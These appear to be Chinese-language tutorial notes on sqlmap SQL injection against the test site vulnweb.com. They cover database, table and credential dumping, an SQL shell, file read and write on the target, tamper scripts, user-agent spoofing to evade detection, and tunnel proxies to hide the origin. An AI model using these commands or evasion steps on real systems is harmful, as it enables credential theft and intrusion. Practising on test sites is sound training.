# WEB攻防-注入工具&SQLMAP&Tamper编写&指纹修改&高权限操作&目录架构

[toc]



## :e-mail:数据猜解-库表列数据&字典

测试：http://vulnweb.com/

![image-20251212172853106](images/image-20251212172853106.png)

`-u`加地址

```
python .\sqlmap.py -u "xxxxxx"
```

![image-20251212173053244](images/image-20251212173053244.png)

```
--current-db              //查询当前数据库
```

![image-20251212175937351](images/image-20251212175937351.png)

![image-20251212175947352](images/image-20251212175947352.png)

```
--tables -D "acuart"          //-D  数据库  从xxx数据库里查询表名
```

![image-20251212180034245](images/image-20251212180034245.png)

![image-20251212180126182](images/image-20251212180126182.png)

```
--columns  -T "users"  -D "acuart"     //查询列  -T是表    -D是数据库
```

```
--dump-all          猜全部
```

 ![image-20251212180221646](images/image-20251212180221646.png)

![image-20251212181019692](images/image-20251212181019692.png)

```
--dump -C  "name,pass"  -T "users"  -D "acuart"   //导出
```

![image-20251212182533438](images/image-20251212182533438.png)

![image-20251212182540793](images/image-20251212182540793.png)

`C:\Users\xxxx\AppData\Local\sqlmap\output`内容存放在这里

![image-20251212182744372](images/image-20251212182744372.png)

```
--is-dba       //查询当前是否为数据库管理员
```

![image-20251212184413550](images/image-20251212184413550.png)

![image-20251212184421543](images/image-20251212184421543.png)

```
--sql-shell   //执行sql命令
```

```
--file-read "c:\xxxx"   //读取文件
```

```
--file-write "c:\xxxx"   --file-dest "c:/"     //把电脑里的xxx文件写进对方的xxx
```

##   POST注入

![image-20251213214556438](images/image-20251213214556438.png)

![image-20251213214725879](images/image-20251213214725879.png)

![image-20251213214824982](images/image-20251213214824982.png)

![image-20251213214944498](images/image-20251213214944498.png)

## 标头注入/文件注入

![image-20251213215135186](images/image-20251213215135186.png)

创建txt文件，放入在sqlmap的根目录下

![image-20251213215817296](images/image-20251213215817296.png)

可以在需要注入的地方加入*号，可以节约时间/==如果这个网站只能手机访问，sqlmap只能采用自己的方式访问==

![image-20251213220318722](images/image-20251213220318722.png)

![image-20251213220614522](images/image-20251213220614522.png)

## 模块使用base64

![image-20251213222758491](images/image-20251213222758491.png)

https://www.cnblogs.com/bmjoker/p/9326258.html 参考

![image-20251213223514406](images/image-20251213223514406.png)

这里有软件自带的模块

![image-20251213223847861](images/image-20251213223847861.png)

```
--tamper=base64encode.py
```

![image-20251213224102413](images/image-20251213224102413.png)

![image-20251213224218236](images/image-20251213224218236.png)

```
--tamper=base64encode.py  --tables
```

![image-20251213224349285](images/image-20251213224349285.png)

面对不同情况可以自己写python代码

![image-20251213225702751](images/image-20251213225702751.png)

## 详细信息

![image-20251213230532547](images/image-20251213230532547.png)

2、打乱默认指纹：  ==替换sqlmap头==

--user-agent ""  #自定义user-agent

--random-agent  #随机user-agent

--time-sec=(2,5) #延迟响应，默认为5

## 等级

 ![image-20251213231152699](images/image-20251213231152699.png)

--level=(1-5) #要执行的测试水平等级，默认为1 

--risk=(0-3)  #测试执行的风险等级，默认为1 

## 代理

![image-20251213231836025](images/image-20251213231836025.png)

联动其他软件

![image-20251213231924201](images/image-20251213231924201.png)

购买隧道代理

![image-20251213232113115](images/image-20251213232113115.png)
